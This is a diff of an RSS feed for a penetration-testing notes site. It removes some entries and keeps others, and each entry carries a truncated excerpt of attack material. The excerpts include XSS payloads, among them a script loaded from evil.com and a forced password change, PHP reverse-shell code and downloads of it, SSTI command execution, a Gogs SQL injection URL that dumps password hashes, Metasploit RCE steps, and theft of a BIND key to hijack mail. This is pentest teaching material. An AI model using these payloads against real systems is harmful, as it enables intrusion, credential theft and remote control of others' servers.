@@ -9,13 +9,6 @@
     <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://documentnation.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Anonymize Traffic with Tor</title>
-      <link>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</link>
-      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</guid>
-      <description>Privacy Friendly OS link Tails Qubes Whonix Anonymization link1. Configure Proxychains linkFirst off, find the location of the proxychains configuration file.&#xA;find / -type f -name &amp;#34;*proxychains*&amp;#34; 2&amp;gt;/dev/null Assume we found /etc/proxychains.conf then modify this file.&#xA;vim /etc/proxychains We need to remove # in front of dynamic_chains, then comment out the strict_chain line and the random_chain line.&#xA;In addition, check the proxy_dns is uncommented for avoiding our DNS to be leaked.</description>
-    </item>
-    <item>
       <title>Elasticsearch Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</link>
       <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
@@ -70,13 +63,6 @@
       <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</guid>
       <description>Payloads linkWe can insert them into URL params, POST params or HTTP headers.&#xA;Additionary, we can also find CVE related XSS here.&#xA;Script Tags link &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;onerror=alert;throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;{onerror=alert}throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;throw onerror=alert,&amp;#39;hello&amp;#39;,123,&amp;#39;world&amp;#39;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;fetch(&amp;#39;/profile?new_password=password&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; %3Cscript%3Ealert%281%29%3C%2Fscript%3E &amp;#39;;alert(1);&amp;#39; In addition, we may be able to execute our JavaScript file which is hosted on our server.&#xA;&amp;lt;script src=&amp;#34;https://evil.com/evil.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; Img Tags link &amp;#34; src=1 onerror=alert(1)&amp;gt; &amp;lt;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x09;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x0A;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img dynsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img lowsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=http://10.</description>
-    </item>
-    <item>
-      <title>Web Reverse Shell</title>
-      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
-      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
-      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
     </item>
     <item>
       <title>Broken Access Control</title>
@@ -387,13 +373,6 @@
       <description>Dumping linkWe can simply use wget command in Linux to download the git repository.&#xA;After that, we can investigate files or all histories.&#xA;# -r: Recursive wget -r https://example.com/.git/ cd example.com git log --stat git checkout &amp;lt;commit_id&amp;gt; Dumping with gitdumper and extracter linkGitTools downloads Git repository of the web application.&#xA;To dump the repository, execute the following commands.&#xA;wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh chmod &amp;#43;x gitdumper.sh ./gitdumper.sh https://example.com/.git/ ./example We should get the git repository in local.</description>
     </item>
     <item>
-      <title>Gitea Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</link>
-      <pubDate>Thu, 06 Jul 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gitea-pentesting/</guid>
-      <description>Common Directories link /api/swagger /api/v1/repos/search?q=test /api/v1/users/search?q=test /api/v1/users/&amp;lt;username&amp;gt;/repos /explore/organizations /explore/repos /explore/users # OAuth /.well-known/openid-configuration /login/oauth/authorize /login/oauth/access_token /login/oauth/userinfo /login/oauth/keys Investigation linkRepositories linkIf we can access to repositories, we might be able to find sensitive information e.g. credentials, subdomains, other domains, secret keys, etc.&#xA;So check the source code.&#xA;Get Secrets in Web Hooks linkIn the existing repository, we may find the secret value in the repository → Settings → Web Hooks.&#xA;Find User Credentials linkIf we have access to the target system and the repository, that is pushed in Gitea, exists in the system, we might be able to find the credential.</description>
-    </item>
-    <item>
       <title>Prototype Pollution in Client-Side</title>
       <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/</link>
       <pubDate>Mon, 03 Jul 2023 00:00:00 +0000</pubDate>
@@ -485,25 +464,11 @@
       <description>Server-Side Template Injection (SSTI) linkWe can execute arbitrary Python script using the server-site template injection.&#xA;First check if the script will be executed as below.&#xA;&amp;lt;title&amp;gt;Website by {{ 2*3 }}&amp;lt;/title&amp;gt; &amp;lt;span&amp;gt;{{ 2*3 }}&amp;lt;/span&amp;gt; # URL parameters https://example.com/?q={{2*3}} If the website shows 6 instead of 2*3, we can execute arbitrary code.&#xA;Try following payloads.&#xA;{% import os %}{{ os.popen(&amp;#34;whoami&amp;#34;).read() }} # Reverse shell. Replace &amp;#34;10.0.0.1&amp;#34; with your own ip # It requires a listener like `nc -lvnp 4444` in local terminal.</description>
     </item>
     <item>
-      <title>Receive Email as Another Address</title>
-      <link>https://documentnation.github.io/docs/hdks/email/receive-email-as-another-address/</link>
-      <pubDate>Sat, 20 May 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/email/receive-email-as-another-address/</guid>
-      <description>Exploit DNS Zone Misconfiguration &amp;amp; BIND Config linkIf target host has the domain for email e.g. “mail.example.com” and we can get BIND secret key, we can update&#xA;1. Get BIND Secret Key linkWe need to get the BIND key in the config file.&#xA;# /etc/bind/named.conf key &amp;#34;rndc-key&amp;#34; { algorithm hmac-sha256; secret &amp;#34;zBatC828gunRa...bA=&amp;#34;; }; 2. Update DNS Zone linkAfter retrieving the BIND secret, update DNS zone to add the new record for receiving email, with subdomain and our ip address.</description>
-    </item>
-    <item>
       <title>Cacti Pentesting</title>
       <link>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</link>
       <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/cacti-pentesting/</guid>
       <description>Default Credentials link admin:admin Common Directories link /include/config.php Remote Code Execution (RCE) CVE-2022-46169 linkReference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/&#xA;msfconsole msf&amp;gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection msf&amp;gt; (set options...) msf&amp;gt; run Also we can refer to Exploit DB.</description>
-    </item>
-    <item>
-      <title>Gogs Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</link>
-      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</guid>
-      <description>SQL injection (CVE-2014-8682) link http://127.0.0.1:3000/api/v1/users/search?q=&amp;#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1-- Automation link sqlmap -u &amp;#34;https://example.com/api/v1/repos/search?q=test&amp;#34; sqlmap -u &amp;#34;https://example.com/api/v1/users/search?q=test&amp;#34; Git Hooks Remote Code Execution (RCE) link msfconsole msf&amp;gt; use exploit/multi/http/gogs_git_hooks_rce msf&amp;gt; (set options...) msf&amp;gt; run </description>
     </item>
     <item>
       <title>Microsoft Exchange Server Pentesting</title>
@@ -707,13 +672,6 @@
       <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/apache-activemq-pentesting/</guid>
       <description>Default Credentials link admin:admin Interaction with MQTT linkIf the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.&#xA;Subscribe to a Topic link # -h: Host # -t: Topic name # -V: MQTT protocol version (5, 31, 311) mosquitto_sub -h example.com -u admin -P admin -t &amp;#39;example/topic&amp;#39; -V 31 Web Shell by File Upload JSP linkActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.</description>
-    </item>
-    <item>
-      <title>Memcache Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/network/protocol/memcache-pentesting/</link>
-      <pubDate>Thu, 23 Feb 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/network/protocol/memcache-pentesting/</guid>
-      <description>Communication linkWe can communicate with memcache server using Netcat.&#xA;nc -vn &amp;lt;ip&amp;gt; 11211 Connection to &amp;lt;ip&amp;gt; 11211 port [tcp/*] succeeded! # Commands in nc version stats stats slabs stats items stats cachedump &amp;lt;number&amp;gt; 0 stats cachedump 1 0 get &amp;lt;item_name&amp;gt; </description>
     </item>
     <item>
       <title>FUEL CMS Pentesting</title>
